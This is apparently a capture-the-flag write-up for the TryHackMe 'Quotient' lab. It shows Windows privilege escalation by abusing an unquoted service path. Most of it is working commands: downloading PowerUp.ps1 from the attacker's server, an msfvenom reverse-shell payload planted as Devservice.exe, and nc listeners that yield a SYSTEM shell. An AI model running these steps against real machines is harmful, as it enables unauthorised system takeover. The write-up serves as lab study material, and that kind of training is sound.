### IP
`10.10.156.117`

# RDP

`rdesktop` didn't work for me, so I logged in with `remmina`

# Enumeration

I uploaded Powersploit's `PowerUp.ps1` to find potential privilege escalation techniques. 

I uploaded the file by starting a server:
	`python3 -m http.server`
I then downloaded the file on powershell:
	`Invoke-WebRequest -Uri "http://10.6.0.114:8000/PowerUp.ps1" -OutFile "C:\Users\Sage\PowerUp.ps1"`

### PowerUp

Luckily, there isn't any active AntiVirus here, so we can run this without any modification:

```pwsh
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

We get the following output:

```
ServiceName    : Development Service
Path           : C:\Program Files\Development Files\Devservice Files\Service.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; 
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'Development Service' -Path <HijackPath>
CanRestart     : False
Name           : Development Service
Check          : Unquoted Service Paths

ServiceName    : Development Service
Path           : C:\Program Files\Development Files\Devservice Files\Service.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'Development Service' -Path <HijackPath>
CanRestart     : False
Name           : Development Service
Check          : Unquoted Service Paths

ServiceName    : Development Service
Path           : C:\Program Files\Development Files\Devservice Files\Service.exe
ModifiablePath : @{ModifiablePath=C:\Program Files\Development Files; IdentityReference=BUILTIN\Users; 
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'Development Service' -Path <HijackPath>
CanRestart     : False
Name           : Development Service
Check          : Unquoted Service Paths

ModifiablePath    : C:\Users\Sage\AppData\Local\Microsoft\WindowsApps
IdentityReference : THM-QUOTIENT\Sage
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\Sage\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\Sage\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Sage\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

```

We can see that there is an unquoted service path vulnerability with the "Development Service" service

# Privilege Escalation

### Background

Unquoted service paths are a problem when the path has spaces in it because of the specific way that Windows tries to resolve the path.

In this case, the path of the service is `C:\Program Files\Development Files\Devservice Files\Service.exe`

Here, when the service is executed, Windows looks in the following paths when trying to execute:

1. `C:\Program.exe`
2. `C:\Program Files\Development.exe`
3. `C:\Program Files\Development Files\Devservice.exe`
4. `C:\Program Files\Development Files\Devservice Files\Service.exe`

Thus, we just need to find a writeable path and put our payload there.

I noticed that `C:\Program Files\Development Files\` was writeable, so I put my payload there

### Payload Generation

Running `systeminfo` on the machine shows that it is 64-bit windows machine.

Thus, we can generate a payload with a tcp reverse shell with the following command:

	`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.0.114 LPORT=1337 -f exe > Devservice.exe`

We can upload this payload the same way as we did before:

	`Invoke-WebRequest -Uri "http://10.6.0.114:8000/Devservice.exe" -OutFile "C:\Program Files\Development Files\Devservice.exe"`

This, when started, will provide us a shell as the user it was started with.

### Payload Execution

When we look at the `Services` gui utility on windows or look at the "Development Service" information with `sc qc "Development Service"` in cmd.exe, we can see the following information:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Development Service
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Development Files\Devservice Files\Service.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Developmenet Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```


`AUTO_START` indicates that this will start automatically on boot. 
`LocalSystem` indicates that this will start as the system user, which has admin access.

Thus, we can start a listener for the reverse shell on our local machine:
	`nc -lvnp 13367`

You can also get a (somewhat) interactive reverse shell with
	`rlwrap nc -lvnp 1337`

When we restart the machine, we get a reverse shell.
`whoami` shows `nt authority\system`

The flag is in `C:\Users\Administrator\Desktop\flag.txt`: `THM{USPE_SUCCESS}`
